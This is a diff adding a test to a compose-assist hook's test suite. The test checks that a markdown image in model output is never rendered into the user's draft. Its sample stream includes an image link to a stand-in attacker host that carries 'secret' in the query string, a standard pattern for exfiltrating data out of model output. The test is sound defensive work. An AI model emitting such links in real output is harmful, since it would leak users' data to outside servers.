@@ -326,6 +326,32 @@ describe("useComposeAssist", { timeout: 20_000 }, () => {
     );
   });
 
+  it("never puts an image from the model into the draft", async () => {
+    const { editor } = renderAssist(SELECTION);
+    openAssist();
+    fireEvent.keyDown(
+      await screen.findByRole("menuitem", { name: /Improve/ }),
+      { key: "i" },
+    );
+    await waitFor(() => expect(requests).toHaveLength(1));
+    await act(async () => {
+      streams[0].push(
+        "Thanks! ![](https://evil.example/p.gif?q=secret) See [the doc][d].\n\n[d]: https://evil.example/doc",
+      );
+      streams[0].end();
+    });
+
+    // What the suggestion says, without the struck-out original.
+    const preview = textWithout(screen.getByLabelText("Suggested text"), "del");
+    expect(preview).toContain("https://evil.example/p.gif?q=secret");
+    expect(preview).toContain("the doc (https://evil.example/doc)");
+
+    fireEvent.keyDown(refineInput(), { key: "Enter" });
+    const html = editor.commitAssist.mock.calls[0][0];
+    expect(html).not.toMatch(/<img/iu);
+    expect(html).toContain("https://evil.example/p.gif?q=secret");
+  });
+
   it("asks for a shorter selection instead of sending a huge one", async () => {
     renderAssist({ ...SELECTION, text: "word ".repeat(5000) });
     openAssist();
